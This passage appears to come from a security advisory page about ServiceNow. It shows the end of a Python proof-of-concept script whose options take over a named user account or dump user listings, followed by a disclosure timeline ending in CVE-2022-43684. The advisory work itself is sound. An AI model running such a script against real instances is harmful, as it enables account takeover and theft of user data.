                <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
                    <span>print</span><span>(</span><span>e</span><span>)</span>


<span>if</span> <span>__name__</span> <span>==</span> <span>&#34;__main__&#34;</span><span>:</span>
    <span>banner</span><span>()</span>
    <span>parser</span> <span>=</span> <span>argparse</span><span>.</span><span>ArgumentParser</span><span>()</span>
    <span>parser</span><span>.</span><span>add_argument</span><span>(</span><span>&#39;-n&#39;</span><span>,</span> <span>type</span><span>=</span><span>str</span><span>,</span> <span>required</span><span>=</span><span>False</span><span>,</span> <span>help</span><span>=</span><span>&#34;Provide a user account to takeover.&#34;</span><span>)</span>
    <span>parser</span><span>.</span><span>add_argument</span><span>(</span><span>&#39;-d&#39;</span><span>,</span> <span>&#39;--dump&#39;</span><span>,</span> <span>action</span><span>=</span><span>&#39;store_true&#39;</span><span>)</span>
    <span>args</span> <span>=</span> <span>parser</span><span>.</span><span>parse_args</span><span>()</span>
    <span>if</span> <span>args</span><span>.</span><span>dump</span><span>:</span>
        <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>10</span><span>):</span>
            <span>get_users</span><span>(</span><span>xrange</span><span>=</span><span>i</span><span>)</span>
    <span>if</span> <span>args</span><span>.</span><span>n</span><span>:</span>
        <span>main</span><span>()</span>
</pre></td></tr></tbody></table></code></p></div>

<h2 id="disclosure-timeline"><span>Disclosure Timeline</span><a href="#disclosure-timeline"><i></i></a></h2>

<div><table>
  <thead>
    <tr>
      <th>Action</th>
      <th>Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reported vulnerabilities to ServiceNow and provided POC script and provides remediation advice</td>
      <td>24th June, 2022</td>
    </tr>
    <tr>
      <td>Security Team Replies to Email regarding vulnerabilities</td>
      <td>27th June, 2022</td>
    </tr>
    <tr>
      <td>Security Team follows up with ServiceNow</td>
      <td>17th August, 2022</td>
    </tr>
    <tr>
      <td>ServiceNow imports Security team to Hacker one</td>
      <td>23th August, 2022</td>
    </tr>
    <tr>
      <td>Security requests for remediation and disclosure</td>
      <td>15th September, 2022</td>
    </tr>
    <tr>
      <td>ServiceNow replies with assigned single CVE number (Multiple bugs discovered)</td>
      <td>25th October, 2022</td>
    </tr>
    <tr>
      <td>Security Team replies to vendor</td>
      <td>28th October, 2022</td>
    </tr>
    <tr>
      <td>Security Team requests for timeline</td>
      <td>4th November, 2022</td>
    </tr>
    <tr>
      <td>ServiceNow responses with waiting next family release</td>
      <td>5th November, 2022</td>
    </tr>
    <tr>
      <td>Hackerone Triager changes report to Triaged</td>
      <td>22th December, 2022</td>
    </tr>
    <tr>
      <td>ServiceNow responses with update</td>
      <td>4th January, 2023</td>
    </tr>
    <tr>
      <td>Service Team requests to disclosure</td>
      <td>23th March, 2023</td>
    </tr>
    <tr>
      <td>ServiceNow Responses regarding timeline on next patch release</td>
      <td>29th March, 2023</td>
    </tr>
    <tr>
      <td>ServiceNow provides update to align internally - timeline not provided.</td>
      <td>12th April, 2023</td>
    </tr>
    <tr>
      <td>Security Team requests for medidation by Hackerone as vendor is delaying.</td>
      <td>2nd June, 2023</td>
    </tr>
    <tr>
      <td>ServiceNow responses with disclosure this month</td>
      <td>5th June, 2023</td>
    </tr>
    <tr>
      <td>ServiceNow publishes an article on support.servicenow.com</td>
      <td>8th June, 2023</td>
    </tr>
    <tr>
      <td>ServiceNow updates MITRE database with the assigned CVE-2022-43684</td>
      <td>16th June, 2023</td>
    </tr>
    <tr>
      <td>Public disclosure</td>
      <td>26th June, 2023</td>
    </tr>
  </tbody>
</table></div>


</div></div>
  </body>
</html>
